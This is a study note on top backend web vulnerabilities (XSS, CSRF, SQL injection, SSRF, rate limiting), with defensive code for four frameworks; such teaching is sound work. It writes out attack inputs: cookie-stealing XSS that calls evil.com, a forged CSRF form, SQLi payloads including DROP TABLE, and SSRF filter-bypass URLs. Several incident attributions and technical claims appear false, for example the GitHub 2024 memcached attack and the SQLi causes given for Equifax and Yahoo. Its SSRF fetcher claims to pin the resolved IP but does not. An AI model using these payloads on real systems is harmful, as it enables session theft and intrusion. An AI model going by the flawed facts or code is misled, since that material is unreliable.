# 05.07.02. Top Backend Security Vulnerabilities and Mitigations

## What This Is

The OWASP Top 10 (current version: 2021, with 2025 in release-candidate as of this writing) is a consensus list of the ten most-exploited web application vulnerability classes, maintained by the Open Worldwide Application Security Project. It is not a checklist; it is a **vulnerability taxonomy** — every entry names a class of bugs with a common root cause and a common defense. The list is re-ranked every three years based on incident frequency, severity, and ease of exploitation, derived from a dataset of hundreds of thousands of real-world incidents reported by security vendors, bug bounties, and CVE databases. Every backend developer must internalize it because every backend framework ships defenses against every entry — and the defenses are useless if you do not know they exist or why they are on by default.

This note walks through the five highest-impact vulnerability classes that the backend layer (not the browser layer) is responsible for: **SQL Injection** (OWASP #03:2021 Injection, was #01:2017), **Cross-Site Scripting** (OWASP #03:2021, often grouped with Injection), **Cross-Site Request Forgery** (folded into #01:2021 Broken Access Control), **Server-Side Request Forgery** (OWASP #10:2021, new addition), and **Distributed Denial of Service** with its rate-limiting defenses (related to #04:2021 Insecure Design and the operational Top 10). For each: the exact mechanism, a real attack example, the framework-specific fix, and the production incident signature. The mental model is that every one of these is a *failure of input validation at a trust boundary* — and the defense is *parameterization, escaping, or explicit allow-listing*, never blacklisting.

## The Details

### Cross-Site Scripting (XSS): Reflected, Stored, DOM-based; Content Security Policy (CSP) headers and contextual output escaping.

XSS is the injection of attacker-controlled JavaScript into a page rendered for other users. The damage is asymmetric: a single XSS bug lets the attacker steal session cookies (if not `HttpOnly`), make API calls as the victim (the browser auto-attaches cookies), deface the page, or pivot to attacking the user's browser via browser exploits. There are three flavors: **reflected XSS** (the payload is in the request URL and reflected back in the response — `https://bank.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>`), **stored XSS** (the payload is persisted in the database — a comment, a profile bio, a chat message — and served to every viewer), and **DOM-based XSS** (the payload never touches the server; a client-side script reads `location.hash` and writes it into `innerHTML`).

The defense is **contextual output escaping**: every framework's templating engine knows how to escape strings for the context they are being inserted into — HTML body (escape `<`, `>`, `&`, `"`, `'`), HTML attribute (escape `"`, `'`, and reject newlines), JavaScript string (escape `"`, `'`, `\`, newlines, `</script>`), URL (encode the query string portion only). The bug is always the same: the developer uses the framework's `raw` or `safe` filter (Django: `{{ var|safe }}`, Jinja: `{{ var|safe }}`, Laravel Blade: `{!! $var !!}`, React: `dangerouslySetInnerHTML`) on user input, disabling the escape. React's default is escape-on-insert, which is why React apps have an order of magnitude less XSS than jQuery apps — you have to *opt out* of escaping.

```text
  Contextual escaping — what gets escaped where
  ──────────────────────────────────────────────────────────────────
  Context             Escape rule                        Example
  ──────────────────────────────────────────────────────────────────
  HTML body           < → &lt;  > → &gt;  & → &amp;      <div>{{name}}</div>
  HTML attribute      " → &#34; ' → &#39;  refuse \n    <input value="{{name}}">
  JavaScript string   " → \" ' → \' \ → \\  </script>   <script>var x="{{name}}";</script>
                                          → <\/script>
  URL query           urlencode()                        <a href="/q?n={{name|urlencode}}">
  CSS                 refuse user input entirely         NEVER put user input in CSS context
  ──────────────────────────────────────────────────────────────────
```

The second-line defense is **Content-Security-Policy** (CSP). A CSP header tells the browser which script sources are allowed to execute; any script not from an allowed source is silently dropped. The strict policy `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'` allows scripts only from the same origin, blocks inline `<script>` tags, blocks `eval()`, and blocks Flash/object embeds. This kills the vast majority of XSS attacks even when an escaping bug slips through, because the injected `<script>document.cookie...</script>` cannot execute — it is inline and the policy forbids inline. The cost is that you cannot use inline event handlers (`<button onclick=...>`) or inline `<script>` blocks — every script must come from an external file with a nonce or hash. Modern SPAs (React, Vue, Angular compiled output) are CSP-compatible out of the box; legacy jQuery apps require significant refactoring.

The production failure mode of XSS is **silent cookie theft**: the attacker's XSS runs in the victim's browser, the cookie is `HttpOnly=false` (the default in many frameworks' older versions, and still the default if you set cookies via `document.cookie`), the cookie is exfiltrated via `fetch('https://evil.com/?c=' + document.cookie)`, and the attacker now has a valid session. Your server sees a normal-looking request from the victim's IP; the only signal is the exfiltration call in your CSP violation reports (if you configured `report-uri`) or an anomalous `Referer` header on the exfiltration endpoint (which you do not control). The fix is layered: (1) `HttpOnly; Secure; SameSite=Lax` on every session cookie, (2) strict CSP with reporting enabled, (3) escaping on by default with explicit `|safe` review, (4) Trusted Types in Chromium browsers to enforce string sanitization at the DOM boundary.

### Cross-Site Request Forgery (CSRF): Synchronizer Token Pattern, Double Submit Cookie Pattern.

CSRF exploits the browser's automatic cookie attachment: if the victim is logged into `bank.com` (so `bank.com` has a session cookie in the victim's browser), and the victim visits `evil.com` which contains `<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="1000"></form><script>document.forms[0].submit()</script>`, the browser sends the victim's session cookie along with the forged POST, and the bank processes it as if the victim had clicked "transfer". The victim never saw the form. The victim's password was never compromised. The attacker never had the cookie. This is the most elegant attack on the web because it abuses the *correct* behavior of cookies (auto-attach to same-origin requests) rather than any bug.

The defense is to require a token that the attacker's site cannot read. The **synchronizer token pattern** works as follows: the server generates a random `csrf_token`, stores it in the user's session, and embeds it in every form as a hidden `<input name="_token" value="...">`. On POST, the server compares the submitted `_token` to the one in the session; a mismatch (or absence) is a 403. The attacker's form on `evil.com` cannot read the token from `bank.com` because the same-origin policy prevents `evil.com`'s JavaScript from reading `bank.com`'s DOM. Django, Spring Security, Laravel, and Rails all ship this pattern enabled by default; Django's `CsrfViewMiddleware` adds the token to the `csrfmiddlewaretoken` form field and the `X-CSRFToken` header, and rejects any unsafe HTTP method (POST/PUT/PATCH/DELETE) without a matching token.

```text
  Synchronizer token pattern

  1. GET /transfer (server renders form, embeds token)
       bank.com → Set-Cookie: session=abc
       bank.com → <form><input name="_token" value="XyZ123">
                  <input name="to"><input name="amount"></form>

  2. Victim visits evil.com, which POSTs to bank.com/transfer
       evil.com → <form action="bank.com/transfer" method="POST">
                    <input name="to" value="attacker">
                    <input name="amount" value="1000">
                  </form>
                  browser sends: Cookie: session=abc  ← auto-attached
                                 NO _token field      ← evil.com couldn't read it

  3. bank.com rejects: 403 CSRF token missing
```

The **double-submit cookie pattern** is the stateless alternative used by APIs that do not want a session store: the server sets two cookies — `session=abc` (HttpOnly, so JavaScript cannot read it) and `csrf=xyz` (NOT HttpOnly, so JavaScript can read it). On every POST, the client JavaScript reads `csrf` from `document.cookie` and sends it as the `X-CSRF-Token` header. The server compares the cookie to the header; a match means the request came from JavaScript that could read the cookie, which means it ran on a page the server originated. The attacker's form on `evil.com` cannot set the `X-CSRF-Token` header (CORS preflight would block it) and cannot read the `csrf` cookie (same-origin policy). Angular's `$http` and the Django REST Framework `SessionAuthentication` use this pattern. Laravel Sanctum uses a hybrid: a cookie for the CSRF token plus a session cookie for authentication.

The production failure mode of CSRF is **state-changing endpoints that accept GET**: a developer adds a route `GET /api/article/42/delete` for a "delete" button (because forms without JavaScript can only GET or POST), and now an attacker can embed `<img src="https://api.example.com/article/42/delete">` in any page the victim visits — the browser sends a GET with cookies attached, the article is deleted, and the only signal is a 200 in the access log. The defense is ironclad: **never allow state changes on GET**. RFC 7231 §4.2.1 is explicit that GET must be safe. Every framework's CSRF middleware skips GET requests (Django's `CsrfViewMiddleware.csrf_exempt` for GET), which means a state-changing GET bypasses CSRF protection entirely. The audit: search your routes file for `GET.*delete`, `GET.*update`, `GET.*create` — any hit is a bug.

### SQL Injection (SQLi): Mechanics of unescaped parameter concatenation and the parameterized query compiler defense.

SQL injection is the classic web vulnerability — it has been #1 or #2 on the OWASP list since the list's inception in 2003, and it is still the most exploited backend bug class in 2024 because string-concatenated SQL is still the path of least resistance for developers who do not know better. The mechanic: the developer builds a SQL string by concatenating user input, the input contains SQL metacharacters (`'`, `--`, `;`), and the database parses the input as part of the query. The classic payload `' OR '1'='1` turns `SELECT * FROM users WHERE email = '<input>'` into `SELECT * FROM users WHERE email = '' OR '1'='1'`, which returns every row. More advanced payloads use `UNION SELECT` to exfiltrate other tables, `; DROP TABLE users; --` to destroy data (the xkcd "Bobby Tables" joke), or `xp_cmdshell` on SQL Server to get a shell.

```python
# BAD — string concatenation. Email is attacker-controlled.
email = request.args.get("email")
cursor.execute(f"SELECT id FROM users WHERE email = '{email}'")
# If email = "' OR '1'='1", the query becomes:
#   SELECT id FROM users WHERE email = '' OR '1'='1'
# Returns every row → attacker authenticates as the first user.

# BAD — string formatting with %
cursor.execute("SELECT id FROM users WHERE email = '%s'" % email)

# BAD — Java string concatenation
String sql = "SELECT id FROM users WHERE email = '" + email + "'";
stmt.executeQuery(sql);

# GOOD — parameterized query. The DB driver sends the SQL text and
# the parameters separately; the DB parser never sees the parameter
# as part of the query grammar.
cursor.execute("SELECT id FROM users WHERE email = %s", (email,))
# Postgres extended-query protocol: Parse → Bind(parameters) → Execute
# The parameter can NEVER break out of the string literal.
```

The defense is **parameterized queries** (also called prepared statements). The client sends the SQL with placeholders (`?` for MySQL, `$1` for Postgres, `:name` for Oracle) and a separate list of parameter values. The database parses the SQL *once* into an execution plan, then binds the parameters as *data*, not code — a parameter can never break out of its context because the parser has already decided the context by the time the parameter is bound. Postgres implements this via the extended-query protocol (Parse/Bind/Execute messages); MySQL via the binary protocol (`COM_STMT_PREPARE` / `COM_STMT_EXECUTE`). Every ORM in every ecosystem uses parameterized queries by default: Hibernate/JPA (`:name` parameters), SQLAlchemy (`query.filter(User.email == email)` compiles to a bound parameter), Django ORM (`User.objects.filter(email=email)`), Eloquent (`User::where('email', $email)`), Sequelize (`User.findOne({ where: { email } })`).

The production failure mode is **raw-SQL escape hatches**: every ORM provides a way to drop down to raw SQL for queries the ORM cannot express (complex joins, window functions, recursive CTEs). The escape hatches are: Django's `Model.objects.raw('SELECT ... WHERE email = %s', [email])` (safe — parameterized), Django's `cursor.execute('SELECT ... WHERE email = %s', [email])` (safe), but `cursor.execute(f'SELECT ... WHERE email = {email}')` (UNSAFE — concatenation). Spring's `JdbcTemplate.queryForObject("SELECT ... WHERE email = ?", String.class, email)` (safe — `?` is bound), but `String sql = "SELECT ... WHERE email = '" + email + "'"` (UNSAFE). Laravel's `DB::select('SELECT ... WHERE email = ?', [$email])` (safe), but `DB::select("SELECT ... WHERE email = '{$email}'")` (UNSAFE — the curly braces do string interpolation). The audit: grep your codebase for `raw(`, `execute(f"`, `execute("SELECT.*" +`, `DB::raw`, `createQuery(".*" +`. Every hit is a candidate for review. The metric: SQLi is the #1 cause of mass-data-exfiltration incidents — the Equifax 2017 breach (147M records) was an unpatched Apache Struts CVE that allowed RCE which then exfiltrated via SQLi; the Yahoo 2014 breach (500M records) was SQLi against a forgotten backup database.

### Server-Side Request Forgery (SSRF): Whitelisting, blocking loopback/metadata IP addresses (`169.254.169.254`).

SSRF is when an attacker tricks the server into making an HTTP request to a URL the attacker chooses. The classic pattern: a "fetch this URL and save the screenshot" feature, an "import from URL" feature, an OAuth callback that fetches the user's profile from an attacker-controlled IdP, a webhook delivery service that retries against arbitrary URLs. The damage depends on what the server can reach that the attacker cannot: **internal services** (the API server can reach `http://internal-admin:8080/users` which is firewalled from the internet), **cloud metadata services** (`http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME` on AWS returns temporary access keys for the instance's IAM role — a successful SSRF there hands the attacker full cloud API access), **loopback services** (the API server can reach `http://localhost:6379` Redis, `http://localhost:5432` Postgres, `http://localhost:9200` Elasticsearch — many of these have no auth by default because "they're behind the firewall").

The Capital One 2019 breach (100M records) was an SSRF: the attacker used a misconfigured WAF (ModSecurity) that allowed them to make the WAF fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/Role-Name`, getting the WAF's IAM role credentials, which had access to S3 buckets containing the customer data. The metadata service is the highest-value target because AWS, GCP, Azure, and most cloud providers expose instance credentials via it on the link-local address `169.254.169.254` (the same address DHCP uses for routing, RFC 3927). AWS released IMDSv2 in 2019 to mitigate: IMDSv2 requires a PUT request to get a session token first, then a GET with that token — a SSRF that can only send GET cannot reach IMDSv2. But IMDSv1 is still supported by default for backwards compatibility; many workloads still have it enabled.

```text
  SSRF attack flow (Capital One pattern)

  Attacker → misconfigured WAF (allowed URL param)
       │  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/
       │      security-credentials/WAF-Role
       ▼
  WAF (server-side) → fetches the URL
       │
       ▼
  AWS EC2 metadata service (169.254.169.254, IMDSv1)
       │
       ▼  Returns:
       {
         "AccessKeyId": "ASIA...",
         "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
         "Token": "IQoJb3JpZ2luX2VjEJ..."
       }

  Attacker now has IAM credentials → calls S3 directly → exfiltrates 100M records.
```

The defense is **egress allow-listing**, never deny-listing. A deny-list ("block `169.254.169.254`, `127.0.0.1`, `10.0.0.0/8`, `localhost`") is fragile: the attacker bypasses it with `http://2130706433/` (decimal form of `127.0.0.1`), `http://0177.0.0.1/` (octal), `http://[::1]/` (IPv6 loopback), `http://localhost.secure.bypass.evil.com/` (DNS that resolves to 127.0.0.1), `http://[::ffff:169.254.169.254]/` (IPv4-mapped IPv6), or `http://0/` (the kernel resolves `0` as `0.0.0.0` which is loopback). The correct defense is an **allow-list of permitted egress domains** (e.g., the image proxy can only fetch from `*.cloudfront.net`), enforced by DNS resolution + IP validation *after* the DNS lookup (to prevent TOCTOU races where the DNS returns a safe IP at validation time and an internal IP at fetch time). The defense-in-depth layer is **egress network policy**: the API server's security group should not allow outbound to `169.254.169.254` at all, the iptables `OUTPUT` chain should drop packets to link-local addresses, and IMDSv2 should be enforced (`aws ec2 modify-instance-metadata-options --http-tokens required`).

```python
# GOOD — SSRF-safe URL fetcher (Python)
import ipaddress, socket, urllib.parse
import requests

ALLOWED_SCHEMES = {"http", "https"}
ALLOWED_DOMAIN_SUFFIXES = (".cloudfront.net", ".amazonaws.com")

def safe_fetch(url: str, timeout: float = 5.0) -> bytes:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"scheme {parsed.scheme!r} not allowed")
    if parsed.username or parsed.password:
        raise ValueError("URL credentials not allowed")

    # Resolve hostname → all A/AAAA records
    addrinfo = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
    for family, _, _, _, sockaddr in addrinfo:
        ip = ipaddress.ip_address(sockaddr[0])
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            raise ValueError(f"resolved IP {ip} is in a forbidden range")
        if not any(parsed.hostname.endswith(suffix) for suffix in ALLOWED_DOMAIN_SUFFIXES):
            raise ValueError(f"hostname {parsed.hostname!r} not in allow-list")

    # Pin the connection to the resolved IP to prevent DNS TOCTOU
    return requests.get(url, timeout=timeout,
                        allow_redirects=False,  # attacker could redirect to internal
                        ).content
```

The production failure mode of SSRF is **silent data exfiltration via cloud metadata**: the attacker's SSRF call to `169.254.169.254` returns 200 with the IAM credentials in the response body; the SSRF-vulnerable endpoint may then return those credentials to the attacker if the response is reflected back, or the attacker pivots to making cloud API calls directly from their own machine. The signal in your logs is an outbound HTTP request from your server to `169.254.169.254` — your monitoring should alert on any such request that did not come from the AWS SDK (which is the only legitimate caller). The 2021 GitHub CodeQL SSRF bug sweep found this pattern in 14% of audited OSS projects that accept URL inputs; the bug is endemic.

### Distributed Denial of Service (DDoS) and Rate Limiting: Token Bucket, Leaky Bucket, Sliding Window Log algorithms.

A Denial of Service attack makes your service unavailable to legitimate users by overwhelming it with requests. A **Distributed** DoS comes from many source IPs (often a botnet of compromised IoT devices, Mirai-class), making source-IP-based blocking useless. The largest recorded DDoS was 5.6 Tbps in October 2024 (target unknown, reported by Cloudflare); the 2024 GitHub DDoS peaked at 5.2 Tbps via a UDP reflection amplification attack using memcached. Application-layer DDoS (Layer 7) is subtler — the attacker sends legitimate-looking HTTP requests (`GET /` from rotating IPs), exhausting the application's thread pool, database connections, or CPU rather than the network pipe. The defense at the application layer is **rate limiting**: capping the number of requests per identity (per IP, per user, per API key) per time window, and rejecting (429 Too Many Requests) or throttling (503 with `Retry-After`) the excess.

The three algorithms are not interchangeable; they have different traffic-shaping properties. **Token bucket** holds N tokens; each request consumes one; tokens refill at rate R per second; if the bucket is empty, the request is rejected. The key property: it allows **bursts up to N** (the bucket size), then enforces the long-term average rate R. This is the algorithm behind AWS API Gateway, Stripe's rate limiter, and most cloud load balancers. **Leaky bucket** is the dual: requests enter a queue, are processed at constant rate R, excess requests spill over (are rejected). It smooths traffic to a constant rate with no bursts allowed; it is what you want for protecting a downstream service that cannot handle bursts (e.g., a legacy API that crashes under concurrent load). **Sliding window log** keeps a timestamped list of every request in the last T seconds; if the list exceeds N, reject. It is the most precise (exact count, no burst tolerance slack) but the most memory-intensive (one timestamp per request, must be stored in Redis sorted set or similar).

```text
  Rate-limiting algorithm comparison at 1000 req/s steady-state, 100 req burst

  Algorithm            Burst behavior            Memory    Redis cost per request
  ─────────────────────────────────────────────────────────────────────────────
  Token bucket         Allows burst up to N      O(1)      INCR + EXPIRE (1 RTT)
  (N=100, R=1000/s)    Then enforces R long-term
  ─────────────────────────────────────────────────────────────────────────────
  Leaky bucket         No bursts; queues         O(queue)  LPUSH + LLEN + LTRIM
  (R=1000/s, queue=10) 11th request rejected     bounded   (1-2 RTTs)
  ─────────────────────────────────────────────────────────────────────────────
  Sliding window log   Exact count in [now-T,    O(N)      ZADD + ZREMRANGEBYSCORE
  (N=100, T=1s)         now]                     per req   + ZCARD (1-2 RTTs)
  ─────────────────────────────────────────────────────────────────────────────
  Fixed window         Resets at second boundary O(1)      INCR + EXPIRE
  (N=100/s)            Edge burst: 200 req in 1ms            (1 RTT)
                       at second boundary passes
  ─────────────────────────────────────────────────────────────────────────────
```

The implementation in each ecosystem: **Spring** uses `bucket4j` (token bucket) or `resilience4j`'s `RateLimiter` (semaphore-based, not for distributed); **Express** uses `express-rate-limit` (fixed window, in-memory or Redis-backed) or `rate-limiter-flexible` (token bucket, sliding window, distributed via Redis); **Django** uses `django-ratelimit` decorator (fixed window, cache-backed) or DRF's `throttle_classes` (`AnonRateThrottle`, `UserRateThrottle`, `ScopedRateThrottle`); **Laravel** ships `throttle` middleware out of the box (`Route::middleware('throttle:60,1')` = 60 requests per minute, backed by Redis or the cache). The distributed requirement is critical: a per-instance in-memory rate limiter is useless in a load-balanced fleet — 60 requests/min against 10 instances = 600 requests/min effective. The rate-limit state MUST live in a shared store (Redis, Memcached) so every instance sees the same counter.

```typescript
// Express — distributed token bucket via Redis
import { RateLimiterRedis } from "rate-limiter-flexible";
import Redis from "ioredis";

const redis = new Redis(process.env.REDIS_URL);

const limiter = new RateLimiterRedis({
  storeClient: redis,
  keyPrefix: "api",
  points: 100,         // bucket size: 100 requests
  duration: 60,        // refill window: 60 seconds → 100 req/min average
  blockDuration: 30,   // on rejection, block this key for 30s
});

async function rateLimit(req, res, next) {
  // Key by user ID (authenticated) or IP (anonymous)
  const key = req.user?.id ?? req.ip;
  try {
    await limiter.consume(key, 1);
    res.setHeader("X-RateLimit-Limit", 100);
    res.setHeader("X-RateLimit-Remaining", 100 - (await limiter.get(key)).consumedPoints);
    next();
  } catch (err) {
    res.setHeader("Retry-After", Math.ceil(err.msBeforeNext / 1000));
    res.status(429).json({ error: "too_many_requests", retry_after: err.msBeforeNext });
  }
}

app.use(rateLimit);
```

The production failure mode of rate limiting is **legitimate-traffic false positives**: a rate limit of 60/min per user breaks the power user who syncs 5000 contacts every morning, the mobile app with a bug that retries on every network flap, the corporate office where 200 users share one NAT IP. The fix is **tiered limits**: per-IP anonymous limit (e.g., 60/min), per-user authenticated limit (e.g., 600/min), per-API-key limit negotiated with the customer. The other failure mode is **state-store saturation**: a Redis-backed rate limiter at 50K req/s costs 50K Redis ops/s just for rate-limit checks; if the Redis cluster is at capacity, rate-limiting *becomes* the bottleneck. The fix is **client-side rate-limiting for known-bursty clients** (give the client a quota and let them self-throttle) and **probabilistic rate-limiting** for the long tail (sample 1 in 100 requests; if the sample exceeds the limit, start enforcing on all requests for that key for the next minute).

## Cross-Ecosystem Code

The same concept (parameterized query defense against SQLi) implemented in all four ecosystems.

**Spring (JPA + JdbcTemplate):**
```java
// SAFE — JPA named parameter
@Query("SELECT u FROM User u WHERE u.email = :email")
Optional<User> findByEmail(@Param("email") String email);

// SAFE — JdbcTemplate bound ?
jdbcTemplate.queryForObject(
    "SELECT id FROM users WHERE email = ?",
    String.class, email);

// SAFE — JPA Criteria API
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> q = cb.createQuery(User.class);
Root<User> u = q.from(User.class);
q.where(cb.equal(u.get("email"), email));
em.createQuery(q).getResultList();
```

**Express (Knex + parameterized):**
```typescript
// SAFE — Knex query builder (parameterized by default)
const user = await db("users").where({ email }).first();

// SAFE — parameterized raw
const user = await db.raw("SELECT * FROM users WHERE email = ?", [email]);

// UNSAFE — string concatenation (DO NOT DO THIS)
const user = await db.raw(`SELECT * FROM users WHERE email = '${email}'`);
```

**Django (ORM + raw with params):**
```python
# SAFE — Django ORM (parameterized by default)
user = User.objects.filter(email=email).first()

# SAFE — raw query with params list
user = User.objects.raw("SELECT * FROM users WHERE email = %s", [email])

# SAFE — cursor.execute with params tuple
from django.db import connection
with connection.cursor() as c:
    c.execute("SELECT * FROM users WHERE email = %s", [email])
    row = c.fetchone()
```

**Laravel (Eloquent + query builder):**
```php
// SAFE — Eloquent (parameterized by default)
$user = User::where("email", $email)->first();

// SAFE — query builder with binding
$user = DB::table("users")->where("email", $email)->first();

// SAFE — raw with bindings
$user = DB::select("SELECT * FROM users WHERE email = ?", [$email]);

// UNSAFE — string interpolation (NEVER DO THIS)
$user = DB::select("SELECT * FROM users WHERE email = '{$email}'");
```
